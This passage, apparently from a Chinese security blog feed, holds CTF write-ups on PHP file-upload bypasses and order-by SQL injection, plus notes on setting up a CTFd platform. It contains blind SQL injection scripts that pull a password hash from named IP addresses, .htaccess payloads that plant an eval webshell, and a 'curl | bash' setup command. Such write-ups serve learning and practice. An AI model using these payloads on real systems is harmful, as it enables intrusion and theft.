punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"_"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"save in:"</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not Allow!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$BlackExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$exts</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9;~^`&amp;|]/is'</span><span class="token punctuation">,</span><span class="token variable">$file_content</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span>         <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$exts</span><span class="token punctuation">,</span> <span class="token variable">$BlackExts</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>         <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\./'</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>upload<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路：</strong></p><p>很恶心，;都过滤了，上传一句话不可见字符webshell。</p><p>文件名后缀黑名单用phtml绕过。</p><h1 id="3-Mixture"><a href="#3-Mixture" class="headerlink" title="3. Mixture"></a>3. Mixture</h1><p><strong>链接：</strong></p><p><strong>考点：</strong>order by sql注入</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://forum.90sec.com/t/topic/296" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/296</a></p><p>exp：</p><pre><code>import requestsurl = &quot;http://49.51.251.99/index.php&quot;data = {    &quot;username&quot;:&quot;xxxxx&quot;,    &quot;password&quot;:&quot;xxxxxxx&quot;,    &quot;submit&quot;:&quot;submit&quot;}cookie ={    &quot;PHPSESSID&quot;: &quot;sou26piclav6f99h79k1l5vmbn&quot;}requests.post(url,data=data,cookies=cookie)flag=&#39;&#39;url=&quot;http://49.51.251.99/member.php?orderby=&quot;for i in range(1,33):    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz,&#39;:        payload=&quot;|(mid((select password from member),{},1)=&#39;{}&#39;)%2b1&quot;.format(i,j)        true_url=url+payload        r=requests.get(true_url,cookies=cookie)        if r.content.index(&#39;tom&#39;)&lt;r.content.index(&#39;1000000&#39;):            print payload+&#39; ok&#39;            flag+=j            print flag            break        else:            print payload#18a960a3a0b3554b314ebe77fe545c85     </code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parsebase_url <span class="token operator">=</span> <span class="token string">'http://134.175.185.244/member.php'</span>url <span class="token operator">=</span> <span class="token string">'http://134.175.185.244/member.php?orderby=|{}'</span>result <span class="token operator">=</span> <span class="token string">''</span>cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'nit7d8990st0kdk4q5b5d91528'</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substring((select database()) from {} for 1))>{}) then 1 else 2 end)'</span>        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{},1))>{}) then 1 else 2 end)'</span>        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),{},1))>{}) then 1 else 2 end)'</span>        <span class="token comment" spellcheck="true"># payload = '(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x6d656d626572),{},1))>{}) then 1 else 2 end)'</span>        payload <span class="token operator">=</span> <span class="token string">'(select case when (ascii(substr((select password from member),{},1))>{}) then 1 else 2 end)'</span>        <span class="token comment" spellcheck="true"># 18a960a3a0b3554b314ebe77fe545c85 </span>        payload <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(payload.format(i,mid))</span>        res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>        <span class="token keyword">if</span> res1<span class="token punctuation">.</span>content<span class="token operator">==</span>res2<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF_contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2020-5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basic_ctfd</title>
      <link href="/2020/05/02/basic-ctfd/"/>
      <url>/2020/05/02/basic-ctfd/</url>
      
        <content type="html"><![CDATA[<h1 id="1-H1ve问题"><a href="#1-H1ve问题" class="headerlink" title="1.  H1ve问题"></a>1.  H1ve问题</h1><h2 id="1-1-frp报错"><a href="#1-1-frp报错" class="headerlink" title="1.1 frp报错"></a>1.1 frp报错</h2><p>因为刚开始我的服务器80端口有一个网站，而H1ve配置文件里frp处需要占据80端口，我就把配置文件里的80改成了30001，就出现了如下报错。</p><p><img src="/2020/05/02/basic-ctfd/1.png" alt="problem"></p><p>解决：</p><p>重新下载H1ve，运行./sh，显示80端口被占用， 使用sudo fuser -k 80/tcp命令停止阿里云的占用进程 。</p><p>最后在阿里云控制台开放8000端口。</p><p>docker-compose -f single.yml up</p><p>搭建成功！</p><h2 id="1-2-上传题目异常"><a href="#1-2-上传题目异常" class="headerlink" title="1.2 上传题目异常"></a>1.2 上传题目异常</h2><p> 后缀名都被去掉了 </p><h1 id="2-H1ve官方文档学习"><a href="#2-H1ve官方文档学习" class="headerlink" title="2. H1ve官方文档学习"></a>2. H1ve官方文档学习</h1><h1 id="3-CTFd"><a href="#3-CTFd" class="headerlink" title="3. CTFd"></a>3. CTFd</h1><p>虽然H1ve很酷炫，但服务器承受不住，还是换回了CTFd。</p><pre><code>docker build -t=镜像名字 .docker run --name=容器名字 -p 9999:22  -d 镜像名 </code></pre><h2 id="3-1-Ubuntu-apt-get-faile-to-fork解决方法"><a href="#3-1-Ubuntu-apt-get-faile-to-fork解决方法" class="headerlink" title="3.1  Ubuntu apt get faile to fork解决方法"></a>3.1  Ubuntu apt get faile to fork解决方法</h2><p><a href="https://pdf-lib.org/Home/Details/3707" target="_blank" rel="noopener">https://pdf-lib.org/Home/Details/3707</a></p><p>原因为 swap空间不够 ，运行如下代码即可！！</p><pre><code>curl -sSL https://manageacloud.com/api/cm/configuration/activate_swap/ubuntu/manageacloud-production-script.sh | bash</code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong>1、</strong>一篇文章带你搭建CTF平台-基于CTFd的H1ve  <a href="https://blog.csdn.net/qq_43625917/article/details/105229456" target="_blank" rel="noopener">https://blog.csdn.net/qq_43625917/article/details/105229456</a></p><p><a href="http://www.qwzf.top/2020/04/01/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0-%E5%9F%BA%E4%BA%8ECTFd%E7%9A%84H1ve/" target="_blank" rel="noopener">http://www.qwzf.top/2020/04/01/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0-%E5%9F%BA%E4%BA%8ECTFd%E7%9A%84H1ve/</a></p><p><strong>2、</strong>阿里云服务器安装Apache服务的坑  <a href="https://blog.csdn.net/cpongo3/article/details/98207020" target="_blank" rel="noopener">https://blog.csdn.net/cpongo3/article/details/98207020</a></p><p><strong>3、</strong>利用frp实现内网穿透  <a href="https://peithon.github.io/2018/12/11/frp-test/" target="_blank" rel="noopener">https://peithon.github.io/2018/12/11/frp-test/</a></p><p><strong>4、</strong>linuxea:简单解释docker的端口和端口暴露(EXPOSE)  <a href="https://www.linuxea.com/2248.html" target="_blank" rel="noopener">https://www.linuxea.com/2248.html</a></p><p><strong>5、</strong>H1ve–开源攻防CTF训练平台  <a href="https://blog.csdn.net/qq_38873461/article/details/104549330" target="_blank" rel="noopener">https://blog.csdn.net/qq_38873461/article/details/104549330</a></p><p><strong>6、</strong>搭建H1ve-ctfd以及如何部署题目  <a href="https://blog.csdn.net/qq_43431158/article/details/104507751?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/104507751?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p><p><strong>7、</strong>服务器利用docker搭建CTFd平台、webug靶场，并映射到公网IP  <a href="https://blog.csdn.net/valecalida/article/details/99697574" target="_blank" rel="noopener">https://blog.csdn.net/valecalida/article/details/99697574</a></p><p><strong>8、</strong>H1ve  <a href="https://h1ve.dao.ge/" target="_blank" rel="noopener">https://h1ve.dao.ge/</a></p><p><strong>9、</strong>手把手教你如何建立一个支持ctf动态独立靶机的靶场  <a href="https://juejin.im/post/5dc5811ff265da4d02626e3c" target="_blank" rel="noopener">https://juejin.im/post/5dc5811ff265da4d02626e3c</a></p><p><strong>10、</strong>教你如何快速打造CTF平台  <a href="https://www.bilibili.com/read/cv4148708" target="_blank" rel="noopener">https://www.bilibili.com/read/cv4148708</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_upload</title>
      <link href="/2020/05/02/best-upload/"/>
      <url>/2020/05/02/best-upload/</url>
      
        <content type="html"><![CDATA[<h1 id="1-文件上传基础"><a href="#1-文件上传基础" class="headerlink" title="1.  文件上传基础"></a>1.  文件上传基础</h1><h2 id="1-1-htaccess"><a href="#1-1-htaccess" class="headerlink" title="1.1  .htaccess"></a>1.1  .htaccess</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>Apache中.htaccess文件利用的总结与新思路拓展  <a href="https://www.cnblogs.com/anbuxuan/p/11867129.html" target="_blank" rel="noopener">https://www.cnblogs.com/anbuxuan/p/11867129.html</a>              </p><p><strong>用法1：利用<code>error log</code>写本地文件 (html编码)</strong> </p><pre><code>php_value include_path &quot;+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-&quot;php_value error_reporting 32367php_value error_log /tmp/fl3g.php#\</code></pre><p><strong>用法2：利用UTF-7编码绕过日志html编码，对error log进行文件包含</strong></p><p>utf-7：<a href="https://www.urlencoder.org/" target="_blank" rel="noopener">https://www.urlencoder.org/</a></p><pre><code>php_value include_path &quot;/tmp&quot;php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;# \</code></pre><p><strong>用法3： auto_append_file 或者 auto_prepend_file</strong> </p><p>通过配置auto_append_file或auto_prepend_file可以向所有php文件中的开头或尾部插入指定的文件的内容。 </p><pre><code>绝对路径：php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;相对路径：php_value auto_append_file &quot;/htaccess&quot;</code></pre><p>.htaccess和cgi</p><pre><code>Options +ExecCGISetHandler cgi-script</code></pre><p><a href="https://www.gem-love.com/ctf/2302.html#Check_In" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2302.html#Check_In</a></p><h1 id="3-真题"><a href="#3-真题" class="headerlink" title="3.  真题"></a>3.  真题</h1><h2 id="3-1-wafupload-（2018网鼎杯）"><a href="#3-1-wafupload-（2018网鼎杯）" class="headerlink" title="3.1   wafupload （2018网鼎杯）"></a>3.1   wafupload <code>（2018网鼎杯）</code></h2><p><strong>题目链接：</strong><a href="http://106.39.10.134:13002/" target="_blank" rel="noopener">http://106.39.10.134:13002/</a></p><p><strong>参考资料：</strong></p><p><strong>1、</strong><code>“网鼎杯”第二场Write up</code>  <a href="https://www.smi1e.top/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAwrite-up/" target="_blank" rel="noopener">https://www.smi1e.top/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAwrite-up/</a></p><p>参考资料已经介绍的很详细了，本地可以搭起来去调试下。</p><p>解法1：利用了move_uploaded_file的一个trick，move忽略/.</p><p>解法2：令<code>$file[count($file) - 1]</code>为php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"phpIsBest"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token shell-comment comment">#mime check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">,</span> <span class="token string">'image/gif'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This type is not allowed!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment">#check filename</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#$file在这里被定义了，注意输入框的内容便是$_POST[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>的内容，其是可以以数组的形式传参的。    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This file is not allowed!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$sandbox</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Success!'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'filepath:'</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Failed!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Upload Your Shell<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Filename<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token 